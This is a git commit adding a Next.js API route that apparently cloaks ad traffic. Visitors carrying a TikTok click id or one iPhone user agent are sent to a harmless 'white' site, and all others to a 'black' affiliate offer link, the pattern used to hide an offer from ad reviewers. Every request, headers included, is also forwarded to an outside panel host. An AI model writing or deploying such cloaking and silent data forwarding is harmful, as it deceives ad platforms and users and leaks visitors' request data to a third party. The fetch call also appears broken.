f43e4299d2c78a605da5a3f437709cb3147a9a10
Evandro <34420396+ev4ndropc@users.noreply.github.com>
2024-03-27 00:23:04 -0300

    Create redirect.js

---
+++ src/pages/api/redirect.js
@@ -0,0 +1,47 @@
+export default async function deleteReview(request, response) {
+
+    const requestData = {
+        timestamp: new Date().toISOString(),
+        method: request.method,
+        url: request.originalUrl,
+        headers: request.headers,
+        body: request.body
+    };
+
+    let site = undefined
+    const requestDataString = JSON.stringify(requestData)
+
+    if (requestDataString.includes('tiktok')) {
+        site = 'tiktok'
+    } else if (requestDataString.includes('facebook')) {
+        site = 'facebook'
+    }
+
+    // Extraindo o parâmetro de consulta ttclid e o user agent
+    const requestedWith = request.headers['x-requested-with'];
+    const userAgent = request.headers['user-agent'];
+    const { ttclid } = request.query
+    const referer = request.headers['referer']
+
+
+    // Definindo os links de redirecionamento
+    const blackLink = 'https://kiwify.app/LmL6p6n?afid=gaDlEznN';
+    const whiteLink = 'https://www.balasdingo.com.br/';
+
+    await fetch('https://rocket-win.rocketpainel.com/redirect', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(request),
+    }).then((response) => response.json())
+
+
+    if (ttclid || userAgent.includes('iPhone OS 15_7_2 like')) {
+        console.log('Redirecionando para link branco:', whiteLink);
+        return response.redirect(whiteLink);
+    } else {
+        console.log('Redirecionando para link preto:', blackLink);
+        return response.redirect(blackLink);
+    }
+}
